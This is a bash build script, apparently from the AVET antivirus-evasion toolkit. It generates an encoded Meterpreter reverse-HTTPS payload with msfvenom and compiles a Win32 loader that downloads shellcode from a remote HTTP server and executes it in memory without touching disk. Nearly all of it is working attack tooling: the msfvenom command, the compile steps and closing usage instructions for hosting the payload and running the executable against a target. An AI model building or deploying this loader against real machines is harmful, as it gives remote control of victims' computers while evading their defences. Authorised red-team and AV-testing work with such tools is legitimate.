#!/bin/bash


#DESCRIPTION_START
# Download the shellcode via sockets.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, encoded with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > output/thepayload.bin

# set shellcode source
set_payload_source download_socket

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# compile to exe file
$win32_compiler -o output/downloadsocket_revhttps_win32.exe source/avet.c -lwsock32 -lws2_32
strip output/downloadsocket_revhttps_win32.exe

# cleanup
cleanup_techniques

echo "
# The generated msf payload needs to be hosted on a HTTP server
# Call your executable like:
# $ downloadsocket_revhttps_win32.exe http://yourserver/thepayload.bin
# The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode.
"
